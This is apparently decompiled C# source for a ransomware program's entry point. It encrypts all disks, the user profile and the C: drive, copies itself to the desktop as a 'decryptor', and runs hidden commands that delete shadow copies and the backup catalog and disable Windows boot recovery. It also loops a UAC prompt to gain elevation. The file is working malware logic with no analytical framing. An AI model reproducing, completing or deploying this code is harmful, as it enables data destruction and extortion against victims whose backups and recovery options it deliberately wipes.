using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace TimeTime;

internal static class Program
{
	private static void DoStuff()
	{
		try
		{
			File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + Settings.decryptor_file_name);
			Cryptor.EncryptDisks();
			Cryptor.TryEncryptFolder(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
			Cryptor.EncryptFolder("C:\\");
		}
		catch (Exception)
		{
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "cmd.exe",
			Arguments = "/C " + commands,
			WindowStyle = ProcessWindowStyle.Hidden
		};
		process.Start();
		process.WaitForExit();
	}

	private static void RunItself(string args)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = Application.get_ExecutablePath(),
			Arguments = args,
			WindowStyle = ProcessWindowStyle.Hidden
		};
		process.Start();
	}

	[STAThread]
	private static void Main()
	{
		string[] commandLineArgs = Environment.GetCommandLineArgs();
		if (commandLineArgs.Length > 1)
		{
			if (commandLineArgs[1] == "/x")
			{
				RunItself("/x1");
				RunItself("/x2");
				RunItself("/x3");
			}
			if (commandLineArgs[1] == "/x1")
			{
				runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
			}
			if (commandLineArgs[1] == "/x1")
			{
				runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
			}
			if (commandLineArgs[1] == "/x1")
			{
				runCommand("wbadmin delete catalog -quiet");
			}
			if (commandLineArgs[1] == "/c")
			{
				Utils.uac_loop("svchost.exe");
				Environment.Exit(0);
			}
			Environment.Exit(0);
		}
		RunItself("/c");
		FileManager.Init();
		string[] files = FileManager.GetFiles();
		foreach (string item in files)
		{
			Cryptor.encr_files.Add(item);
		}
		try
		{
			Thread thread = new Thread(DoStuff);
			thread.Start();
		}
		catch (Exception)
		{
			DoStuff();
		}
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Thread.Sleep(15000);
		Application.Run((Form)(object)new Form1());
	}
}
